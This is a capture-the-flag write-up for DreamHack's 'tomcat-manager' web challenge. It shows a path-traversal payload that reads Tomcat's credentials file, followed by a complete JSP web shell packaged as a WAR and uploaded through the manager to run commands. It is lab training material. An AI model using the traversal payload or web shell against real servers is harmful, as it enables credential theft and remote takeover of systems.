# tomcat-manager — DreamHack

> **Room / Challenge:** tomcat-manager (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** tomcat-manager (web)
- **Link**: `https://dreamhack.io/wargame/challenges/248`
- **Level:** `2`
- **Date:** `17-11-2025`

---

## Goal

Examining the code and leverage LFI and RCE to capture the flag.

## My Solution

The source code has the `ROOT.war` besides `Dockerfile` and `tomcat-users.xml`. The `tomcat-users.xml` content:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">

    <role rolename="manager-gui"/>
    <role rolename="manager-script"/>
    <role rolename="manager-jmx"/>
    <role rolename="manager-status"/>
    <role rolename="admin-gui"/>
    <role rolename="admin-script"/>
    <user username="tomcat" password="[**SECRET**]" roles="manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script" />
</tomcat-users>
```

It suggests that we have to find the password for user `tomcat` to get access to the code, let's examine the source in `ROOT.war`. I use **JD-GUI**:
![Guide image](./screenshots/1.png)

Found a really intersting file/route `image.jsp`:

```jsp
<%@ page trimDirectiveWhitespaces="true" %>
<%
String filepath = getServletContext().getRealPath("resources") + "/";
String _file = request.getParameter("file");

response.setContentType("image/jpeg");
try{
    java.io.FileInputStream fileInputStream = new java.io.FileInputStream(filepath + _file);
    int i;
    while ((i = fileInputStream.read()) != -1) {
        out.write(i);
    }
    fileInputStream.close();
}catch(Exception e){
    response.sendError(404, "Not Found !" );
}
%>
```

This route is vulnerable to LFI (Local File Intrusion), this allows us to view image of any content in the source code without any filters. Based on the `Dockerfile` we know that the `tomcat-users.xml` is in `/usr/local/tomcat/conf/tomcat-users.xml`, so we can visit this URL to get its content:

```
/image.jsp?file=../../../conf/tomcat-users.xml
```

![Guide image](./screenshots/2.png)

Found the password for `tomcat` user, now logged in as `tomcat` in `/manager/html`:
![Guide image](./screenshots/3.png)
Based on the description, we have to get access to the flag through `/flag`, but currently I cannot see any route `/flag`, so I think of a way to leverage RCE (Remote Code Execution), make a `shell.jsp`:

```jsp
<%@ page import="java.io.*" %> <% String cmd = request.getParameter("cmd"); if
(cmd != null) { Process p = Runtime.getRuntime().exec(cmd); OutputStream os =
p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis =
new DataInputStream(in); String disr = dis.readLine(); while (disr != null) {
out.println(disr); disr = dis.readLine(); } } %>
```

This code allows us to have a remote shell and run via `?cmd=<cmd>`, convert it to `.war`:

```bash
zip shell.war shell.jsp
```

Upload it to the Tomcat manager UI:
![Guide image](./screenshots/4.png)
Now we can run our script through `/shell/shell.jsp?cmd=<cmd>`, run `/shell/shell.jsp?cmd=/flag` to get the flag:
![Guide image](./screenshots/5.png)
